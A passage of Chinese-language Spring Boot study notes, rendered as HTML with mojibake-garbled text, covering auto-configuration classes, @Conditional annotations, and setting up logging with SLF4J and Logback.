 <span class="comment">//åˆ¤æ–­é…ç½®æ–‡ä»¶ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªé…ç½®  spring.http.encoding.enabledï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ¤æ–­ä¹Ÿæ˜¯æˆç«‹çš„</span></span><br><span class="line"><span class="comment">//å³ä½¿æˆ‘ä»¬é…ç½®æ–‡ä»¶ä¸­ä¸é…ç½®pring.http.encoding.enabled=trueï¼Œä¹Ÿæ˜¯é»˜è®¤ç”Ÿæ•ˆçš„ï¼›</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpEncodingAutoConfiguration</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//ä»–å·²ç»å’ŒSpringBootçš„é…ç½®æ–‡ä»¶æ˜ å°„äº†</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> HttpEncodingProperties properties;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//åªæœ‰ä¸€ä¸ªæœ‰å‚æ„é€ å™¨çš„æƒ…å†µä¸‹ï¼Œå‚æ•°çš„å€¼å°±ä¼šä»å®¹å™¨ä¸­æ‹¿</span></span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">HttpEncodingAutoConfiguration</span><span class="params">(HttpEncodingProperties properties)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.properties = properties;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>   <span class="comment">//ç»™å®¹å™¨ä¸­æ·»åŠ ä¸€ä¸ªç»„ä»¶ï¼Œè¿™ä¸ªç»„ä»¶çš„æŸäº›å€¼éœ€è¦ä»propertiesä¸­è·å–</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(CharacterEncodingFilter.class)</span> <span class="comment">//åˆ¤æ–­å®¹å™¨æ²¡æœ‰è¿™ä¸ªç»„ä»¶ï¼Ÿ</span></span><br><span class="line"><span class="keyword">public</span> CharacterEncodingFilter <span class="title function_">characterEncodingFilter</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">CharacterEncodingFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OrderedCharacterEncodingFilter</span>();</span><br><span class="line">filter.setEncoding(<span class="built_in">this</span>.properties.getCharset().name());</span><br><span class="line">filter.setForceRequestEncoding(<span class="built_in">this</span>.properties.shouldForce(Type.REQUEST));</span><br><span class="line">filter.setForceResponseEncoding(<span class="built_in">this</span>.properties.shouldForce(Type.RESPONSE));</span><br><span class="line"><span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å½“å‰ä¸åŒçš„æ¡ä»¶åˆ¤æ–­ï¼Œå†³å®šè¿™ä¸ªé…ç½®ç±»æ˜¯å¦ç”Ÿæ•ˆï¼Ÿ</p><p>ä¸€ä½†è¿™ä¸ªé…ç½®ç±»ç”Ÿæ•ˆï¼›è¿™ä¸ªé…ç½®ç±»å°±ä¼šç»™å®¹å™¨ä¸­æ·»åŠ å„ç§ç»„ä»¶ï¼›è¿™äº›ç»„ä»¶çš„å±æ€§æ˜¯ä»å¯¹åº”çš„propertiesç±»ä¸­è·å–çš„ï¼Œè¿™äº›ç±»é‡Œé¢çš„æ¯ä¸€ä¸ªå±æ€§åˆæ˜¯å’Œé…ç½®æ–‡ä»¶ç»‘å®šçš„ï¼›</p><p>5ï¼‰ã€æ‰€æœ‰åœ¨é…ç½®æ–‡ä»¶ä¸­èƒ½é…ç½®çš„å±æ€§éƒ½æ˜¯åœ¨xxxxPropertiesç±»ä¸­å°è£…è€…â€˜ï¼›é…ç½®æ–‡ä»¶èƒ½é…ç½®ä»€ä¹ˆå°±å¯ä»¥å‚ç…§æŸä¸ªåŠŸèƒ½å¯¹åº”çš„è¿™ä¸ªå±æ€§ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;spring.http.encoding&quot;)</span>  <span class="comment">//ä»é…ç½®æ–‡ä»¶ä¸­è·å–æŒ‡å®šçš„å€¼å’Œbeançš„å±æ€§è¿›è¡Œç»‘å®š</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpEncodingProperties</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Charset</span> <span class="variable">DEFAULT_CHARSET</span> <span class="operator">=</span> Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure><p><strong>ç²¾é«“ï¼š</strong></p><p>â€‹<strong>1ï¼‰ã€SpringBootå¯åŠ¨ä¼šåŠ è½½å¤§é‡çš„è‡ªåŠ¨é…ç½®ç±»</strong></p><p>â€‹<strong>2ï¼‰ã€æˆ‘ä»¬çœ‹æˆ‘ä»¬éœ€è¦çš„åŠŸèƒ½æœ‰æ²¡æœ‰SpringBooté»˜è®¤å†™å¥½çš„è‡ªåŠ¨é…ç½®ç±»ï¼›</strong></p><p>â€‹<strong>3ï¼‰ã€æˆ‘ä»¬å†æ¥çœ‹è¿™ä¸ªè‡ªåŠ¨é…ç½®ç±»ä¸­åˆ°åº•é…ç½®äº†å“ªäº›ç»„ä»¶ï¼›ï¼ˆåªè¦æˆ‘ä»¬è¦ç”¨çš„ç»„ä»¶æœ‰ï¼Œæˆ‘ä»¬å°±ä¸éœ€è¦å†æ¥é…ç½®äº†ï¼‰</strong></p><p>â€‹<strong>4ï¼‰ã€ç»™å®¹å™¨ä¸­è‡ªåŠ¨é…ç½®ç±»æ·»åŠ ç»„ä»¶çš„æ—¶å€™ï¼Œä¼šä»propertiesç±»ä¸­è·å–æŸäº›å±æ€§ã€‚æˆ‘ä»¬å°±å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šè¿™äº›å±æ€§çš„å€¼ï¼›</strong></p><p>xxxxAutoConfigurartionï¼šè‡ªåŠ¨é…ç½®ç±»ï¼›</p><p>ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶</p><p>xxxxProperties:å°è£…é…ç½®æ–‡ä»¶ä¸­ç›¸å…³å±æ€§ï¼›</p><h3><span id="2-ç»†èŠ‚">2ã€ç»†èŠ‚</span></h3><h4><span id="1-conditionalæ´¾ç”Ÿæ³¨è§£springæ³¨è§£ç‰ˆåŸç”Ÿçš„conditionalä½œç”¨">1ã€@Conditionalæ´¾ç”Ÿæ³¨è§£ï¼ˆSpringæ³¨è§£ç‰ˆåŸç”Ÿçš„@Conditionalä½œç”¨ï¼‰</span></h4><p>ä½œç”¨ï¼šå¿…é¡»æ˜¯@ConditionalæŒ‡å®šçš„æ¡ä»¶æˆç«‹ï¼Œæ‰ç»™å®¹å™¨ä¸­æ·»åŠ ç»„ä»¶ï¼Œé…ç½®é…é‡Œé¢çš„æ‰€æœ‰å†…å®¹æ‰ç”Ÿæ•ˆï¼›</p><table><thead><tr><th>@Conditionalæ‰©å±•æ³¨è§£</th><th>ä½œç”¨ï¼ˆåˆ¤æ–­æ˜¯å¦æ»¡è¶³å½“å‰æŒ‡å®šæ¡ä»¶ï¼‰</th></tr></thead><tbody><tr><td>@ConditionalOnJava</td><td>ç³»ç»Ÿçš„javaç‰ˆæœ¬æ˜¯å¦ç¬¦åˆè¦æ±‚</td></tr><tr><td>@ConditionalOnBean</td><td>å®¹å™¨ä¸­å­˜åœ¨æŒ‡å®šBeanï¼›</td></tr><tr><td>@ConditionalOnMissingBean</td><td>å®¹å™¨ä¸­ä¸å­˜åœ¨æŒ‡å®šBeanï¼›</td></tr><tr><td>@ConditionalOnExpression</td><td>æ»¡è¶³SpELè¡¨è¾¾å¼æŒ‡å®š</td></tr><tr><td>@ConditionalOnClass</td><td>ç³»ç»Ÿä¸­æœ‰æŒ‡å®šçš„ç±»</td></tr><tr><td>@ConditionalOnMissingClass</td><td>ç³»ç»Ÿä¸­æ²¡æœ‰æŒ‡å®šçš„ç±»</td></tr><tr><td>@ConditionalOnSingleCandidate</td><td>å®¹å™¨ä¸­åªæœ‰ä¸€ä¸ªæŒ‡å®šçš„Beanï¼Œæˆ–è€…è¿™ä¸ªBeanæ˜¯é¦–é€‰Bean</td></tr><tr><td>@ConditionalOnProperty</td><td>ç³»ç»Ÿä¸­æŒ‡å®šçš„å±æ€§æ˜¯å¦æœ‰æŒ‡å®šçš„å€¼</td></tr><tr><td>@ConditionalOnResource</td><td>ç±»è·¯å¾„ä¸‹æ˜¯å¦å­˜åœ¨æŒ‡å®šèµ„æºæ–‡ä»¶</td></tr><tr><td>@ConditionalOnWebApplication</td><td>å½“å‰æ˜¯webç¯å¢ƒ</td></tr><tr><td>@ConditionalOnNotWebApplication</td><td>å½“å‰ä¸æ˜¯webç¯å¢ƒ</td></tr><tr><td>@ConditionalOnJndi</td><td>JNDIå­˜åœ¨æŒ‡å®šé¡¹</td></tr></tbody></table><p><strong>è‡ªåŠ¨é…ç½®ç±»å¿…é¡»åœ¨ä¸€å®šçš„æ¡ä»¶ä¸‹æ‰èƒ½ç”Ÿæ•ˆï¼›</strong></p><p>æˆ‘ä»¬æ€ä¹ˆçŸ¥é“å“ªäº›è‡ªåŠ¨é…ç½®ç±»ç”Ÿæ•ˆï¼›</p><p>**&#x3D;&#x3D;æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯ç”¨  debug&#x3D;trueå±æ€§ï¼›æ¥è®©æ§åˆ¶å°æ‰“å°è‡ªåŠ¨é…ç½®æŠ¥å‘Š&#x3D;&#x3D;**ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„çŸ¥é“å“ªäº›è‡ªåŠ¨é…ç½®ç±»ç”Ÿæ•ˆï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">=========================</span><br><span class="line">AUTO-CONFIGURATION REPORT</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Positive matches:ï¼ˆè‡ªåŠ¨é…ç½®ç±»å¯ç”¨çš„ï¼‰</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   DispatcherServletAutoConfiguration matched:</span><br><span class="line">      - <span class="meta">@ConditionalOnClass</span> found required class <span class="string">&#x27;org.springframework.web.servlet.DispatcherServlet&#x27;</span>; <span class="meta">@ConditionalOnMissingClass</span> did not find unwanted <span class="title function_">class</span> <span class="params">(OnClassCondition)</span></span><br><span class="line">      - <span class="meta">@ConditionalOnWebApplication</span> (required) found <span class="title function_">StandardServletEnvironment</span> <span class="params">(OnWebApplicationCondition)</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">Negative matches:ï¼ˆæ²¡æœ‰å¯åŠ¨ï¼Œæ²¡æœ‰åŒ¹é…æˆåŠŸçš„è‡ªåŠ¨é…ç½®ç±»ï¼‰</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">   ActiveMQAutoConfiguration:</span><br><span class="line">      Did not match:</span><br><span class="line">         - <span class="meta">@ConditionalOnClass</span> did not find required classes <span class="string">&#x27;javax.jms.ConnectionFactory&#x27;</span>, <span class="string">&#x27;org.apache.activemq.ActiveMQConnectionFactory&#x27;</span> (OnClassCondition)</span><br><span class="line"></span><br><span class="line">   AopAutoConfiguration:</span><br><span class="line">      Did not match:</span><br><span class="line">         - <span class="meta">@ConditionalOnClass</span> did not find required classes <span class="string">&#x27;org.aspectj.lang.annotation.Aspect&#x27;</span>, <span class="string">&#x27;org.aspectj.lang.reflect.Advice&#x27;</span> (OnClassCondition)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h1><span id="ä¸‰-æ—¥å¿—">ä¸‰ã€æ—¥å¿—</span></h1><h2><span id="1-æ—¥å¿—æ¡†æ¶">1ã€æ—¥å¿—æ¡†æ¶</span></h2><p> å°å¼ ï¼›å¼€å‘ä¸€ä¸ªå¤§å‹ç³»ç»Ÿï¼›</p><p>â€‹1ã€System.out.println(â€œâ€)ï¼›å°†å…³é”®æ•°æ®æ‰“å°åœ¨æ§åˆ¶å°ï¼›å»æ‰ï¼Ÿå†™åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Ÿ</p><p>â€‹2ã€æ¡†æ¶æ¥è®°å½•ç³»ç»Ÿçš„ä¸€äº›è¿è¡Œæ—¶ä¿¡æ¯ï¼›æ—¥å¿—æ¡†æ¶ ï¼›  zhanglogging.jarï¼›</p><p>â€‹3ã€é«˜å¤§ä¸Šçš„å‡ ä¸ªåŠŸèƒ½ï¼Ÿå¼‚æ­¥æ¨¡å¼ï¼Ÿè‡ªåŠ¨å½’æ¡£ï¼Ÿxxxxï¼Ÿ  zhanglogging-good.jarï¼Ÿ</p><p>â€‹4ã€å°†ä»¥å‰æ¡†æ¶å¸ä¸‹æ¥ï¼Ÿæ¢ä¸Šæ–°çš„æ¡†æ¶ï¼Œé‡æ–°ä¿®æ”¹ä¹‹å‰ç›¸å…³çš„APIï¼›zhanglogging-prefect.jarï¼›</p><p>â€‹5ã€JDBCâ€”æ•°æ®åº“é©±åŠ¨ï¼›</p><p>â€‹å†™äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£å±‚ï¼›æ—¥å¿—é—¨é¢ï¼ˆæ—¥å¿—çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼‰ï¼›logging-abstract.jarï¼›</p><p>â€‹ç»™é¡¹ç›®ä¸­å¯¼å…¥å…·ä½“çš„æ—¥å¿—å®ç°å°±è¡Œäº†ï¼›æˆ‘ä»¬ä¹‹å‰çš„æ—¥å¿—æ¡†æ¶éƒ½æ˜¯å®ç°çš„æŠ½è±¡å±‚ï¼›</p><p><strong>å¸‚é¢ä¸Šçš„æ—¥å¿—æ¡†æ¶ï¼›</strong></p><p>JULã€JCLã€Jboss-loggingã€logbackã€log4jã€log4j2ã€slf4jâ€¦.</p><table><thead><tr><th>æ—¥å¿—é—¨é¢  ï¼ˆæ—¥å¿—çš„æŠ½è±¡å±‚ï¼‰</th><th>æ—¥å¿—å®ç°</th></tr></thead><tbody><tr><td><del>JCLï¼ˆJakarta  Commons Loggingï¼‰</del>    SLF4jï¼ˆSimple  Logging Facade for Javaï¼‰    <strong><del>jboss-logging</del></strong></td><td>Log4j  JULï¼ˆjava.util.loggingï¼‰  Log4j2  <strong>Logback</strong></td></tr></tbody></table><p>å·¦è¾¹é€‰ä¸€ä¸ªé—¨é¢ï¼ˆæŠ½è±¡å±‚ï¼‰ã€å³è¾¹æ¥é€‰ä¸€ä¸ªå®ç°ï¼›</p><p>æ—¥å¿—é—¨é¢ï¼š  SLF4Jï¼›</p><p>æ—¥å¿—å®ç°ï¼šLogbackï¼›</p><p>SpringBootï¼šåº•å±‚æ˜¯Springæ¡†æ¶ï¼ŒSpringæ¡†æ¶é»˜è®¤æ˜¯ç”¨JCLï¼›â€˜</p><p>â€‹<strong>&#x3D;&#x3D;SpringBooté€‰ç”¨ SLF4jå’Œlogbackï¼›&#x3D;&#x3D;</strong></p><h2><span id="2-slf4jä½¿ç”¨">2ã€SLF4jä½¿ç”¨</span></h2><h3><span id="1-å¦‚ä½•åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨slf4j-httpswwwslf4jorg">1ã€å¦‚ä½•åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨SLF4j   </span></h3><p>ä»¥åå¼€å‘çš„æ—¶å€™ï¼Œæ—¥å¿—è®°å½•æ–¹æ³•çš„è°ƒç”¨ï¼Œä¸åº”è¯¥æ¥ç›´æ¥è°ƒç”¨æ—¥å¿—çš„å®ç°ç±»ï¼Œè€Œæ˜¯è°ƒç”¨æ—¥å¿—æŠ½è±¡å±‚é‡Œé¢çš„æ–¹æ³•ï¼›</p><p>ç»™ç³»ç»Ÿé‡Œé¢å¯¼å…¥slf4jçš„jarå’Œ  logbackçš„å®ç°jar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(HelloWorld.class);</span><br><span class="line">    logger.info(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å›¾ç¤ºï¼›</p><p><img src="/images/concrete-bindings.png"></p><p>æ¯ä¸€ä¸ªæ—¥å¿—çš„å®ç°æ¡†æ¶éƒ½æœ‰è‡ªå·±çš„é…ç½®æ–‡ä»¶ã€‚ä½¿ç”¨slf4jä»¥åï¼Œ<strong>é…ç½®æ–‡ä»¶è¿˜æ˜¯åšæˆæ—¥å¿—å®ç°æ¡†æ¶è‡ªå·±æœ¬èº«çš„é…ç½®æ–‡ä»¶ï¼›</strong></p><h3><span id="2-é—ç•™é—®é¢˜">2ã€é—ç•™é—®é¢˜</span></h3><p>aï¼ˆslf4j+logbackï¼‰: Springï¼ˆcommons-loggingï¼‰ã€Hibernateï¼ˆjboss-loggingï¼‰ã€MyBatisã€xxxx</p><p>ç»Ÿä¸€æ—¥å¿—è®°å½•ï¼Œå³ä½¿æ˜¯åˆ«çš„æ¡†æ¶å’Œæˆ‘ä¸€èµ·ç»Ÿä¸€ä½¿ç”¨slf4jè¿›è¡Œè¾“å‡ºï¼Ÿ</p><p><img src="/images/legacy.png"></p><p><strong>å¦‚ä½•è®©ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ—¥å¿—éƒ½ç»Ÿä¸€åˆ°slf4jï¼›</strong></p><p>&#x3D;&#x3D;1ã€å°†ç³»ç»Ÿä¸­å…¶ä»–æ—¥å¿—æ¡†æ¶å…ˆæ’é™¤å‡ºå»ï¼›&#x3D;&#x3D;</p><p>&#x3D;&#x3D;2ã€ç”¨ä¸­é—´åŒ…æ¥æ›¿æ¢åŸæœ‰çš„æ—¥å¿—æ¡†æ¶ï¼›&#x3D;&#x3D;</p><p>&#x3D;&#x3D;3ã€æˆ‘ä»¬å¯¼å…¥slf4jå…¶ä»–çš„å®ç°&#x3D;&#x3D;</p><h2><span id="3-springbootæ—¥å¿—å…³ç³»">3ã€SpringBootæ—¥å¿—å…³ç³»</span></h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SpringBootä½¿ç”¨å®ƒæ¥åšæ—¥å¿—åŠŸèƒ½ï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åº•å±‚ä¾èµ–å…³ç³»</p><p><img src="/images/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131220946.png"></p><p>æ€»ç»“ï¼š</p><p>â€‹1ï¼‰ã€SpringBootåº•å±‚ä¹Ÿæ˜¯ä½¿ç”¨slf4j+logbackçš„æ–¹å¼è¿›è¡Œæ—¥å¿—è®°å½•</p><p>â€‹2ï¼‰ã€SpringBootä¹ŸæŠŠå…¶ä»–çš„æ—¥å¿—éƒ½æ›¿æ¢æˆäº†slf4jï¼›</p><p>â€‹3ï¼‰ã€ä¸­é—´æ›¿æ¢åŒ…ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">LogFactory</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">UNSUPPORTED_OPERATION_IN_JCL_OVER_SLF4J</span> <span class="operator">=</span> <span class="string">&quot;http://www.slf4j.org/codes.html#unsupported_operation_in_jcl_over_slf4j&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">LogFactory</span> <span class="variable">logFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SLF4JLogFactory</span>();</span><br></pre></td></tr></table></figure><p><img src="/2020/03/30/Spring%20Boot%E7%AC%94%E8%AE%B0/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20180131221411.png"></p><p>â€‹4ï¼‰ã€å¦‚æœæˆ‘ä»¬è¦å¼•å…¥å…¶ä»–æ¡†æ¶ï¼Ÿä¸€å®šè¦æŠŠè¿™ä¸ªæ¡†æ¶çš„é»˜è®¤æ—¥å¿—ä¾èµ–ç§»é™¤æ‰ï¼Ÿ</p><p>â€‹Springæ¡†æ¶ç”¨çš„æ˜¯commons-loggingï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>&#x3D;&#x3D;SpringBootèƒ½è‡ªåŠ¨é€‚é…æ‰€æœ‰çš„æ—¥å¿—ï¼Œè€Œä¸”åº•å±‚ä½¿ç”¨slf4j+logbackçš„æ–¹å¼è®°å½•æ—¥å¿—ï¼Œå¼•å…¥å…¶ä»–æ¡†æ¶çš„æ—¶å€™ï¼Œåªéœ€è¦æŠŠè¿™ä¸ªæ¡†æ¶ä¾èµ–çš„æ—¥å¿—æ¡†æ¶æ’é™¤æ‰å³å¯ï¼›&#x3D;&#x3D;</strong></p><h2><span id="4-æ—¥å¿—ä½¿ç”¨">4ã€æ—¥å¿—ä½¿ç”¨ï¼›</span></h2><h3><span id="1-é»˜è®¤é…ç½®">1ã€é»˜è®¤é…ç½®</span></h3><p>SpringBooté»˜è®¤å¸®æˆ‘ä»¬é…ç½®å¥½äº†æ—¥å¿—ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®°å½•å™¨</span></span><br><span class="line"><span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(getClass());</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">contextLoads</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//System.out.println();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ—¥å¿—çš„çº§åˆ«ï¼›</span></span><br><span class="line"><span class="comment">//ç”±ä½åˆ°é«˜   trace&lt;debug&lt;info&lt;warn&lt;error</span></span><br><span class="line"><span class="comment">//å¯ä»¥è°ƒæ•´è¾“å‡ºçš„æ—¥å¿—çº§åˆ«ï¼›æ—¥å¿—å°±åªä¼šåœ¨è¿™ä¸ªçº§åˆ«ä»¥ä»¥åçš„é«˜çº§åˆ«ç”Ÿæ•ˆ</span></span><br><span class="line">logger.trace(<span class="string">&quot;è¿™æ˜¯traceæ—¥å¿—...&quot;</span>);</span><br><span class="line">logger.debug(<span class="string">&quot;è¿™æ˜¯debugæ—¥å¿—...&quot;</span>);</span><br><span class="line"><span class="comment">//SpringBooté»˜è®¤ç»™æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯infoçº§åˆ«çš„ï¼Œæ²¡æœ‰æŒ‡å®šçº§åˆ«çš„å°±ç”¨SpringBooté»˜è®¤è§„å®šçš„çº§åˆ«ï¼›rootçº§åˆ«</span></span><br><span class="line">logger.info(<span class="string">&quot;è¿™æ˜¯infoæ—¥å¿—...&quot;</span>);</span><br><span class="line">logger.warn(<span class="string">&quot;è¿™æ˜¯warnæ—¥å¿—...&quot;</span>);</span><br><span class="line">logger.error(<span class="string">&quot;è¿™æ˜¯erroræ—¥å¿—...&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>    æ—¥å¿—è¾“å‡ºæ ¼å¼ï¼š        %dè¡¨ç¤ºæ—¥æœŸæ—¶é—´ï¼Œ        %threadè¡¨ç¤ºçº¿ç¨‹åï¼Œ        %-5levelï¼šçº§åˆ«ä»å·¦æ˜¾ç¤º5ä¸ªå­—ç¬¦å®½åº¦        %logger&#123;50&#125; è¡¨ç¤ºloggeråå­—æœ€é•¿50ä¸ªå­—ç¬¦ï¼Œå¦åˆ™æŒ‰ç…§å¥ç‚¹åˆ†å‰²ã€‚         %msgï¼šæ—¥å¿—æ¶ˆæ¯ï¼Œ        %næ˜¯æ¢è¡Œç¬¦    --&gt;    %d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%thread] %-5level %logger&#123;50&#125; - %msg%n</code></pre><p>SpringBootä¿®æ”¹æ—¥å¿—çš„é»˜è®¤é…ç½®</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging.level.com.atguigu</span>=<span class="string">trace</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#logging.path=</span></span><br><span class="line"><span class="comment"># ä¸æŒ‡å®šè·¯å¾„åœ¨å½“å‰é¡¹ç›®ä¸‹ç”Ÿæˆspringboot.logæ—¥å¿—</span></span><br><span class="line"><span class="comment"># å¯ä»¥æŒ‡å®šå®Œæ•´çš„è·¯å¾„ï¼›</span></span><br><span class="line"><span class="comment">#logging.file=G:/springboot.log</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># 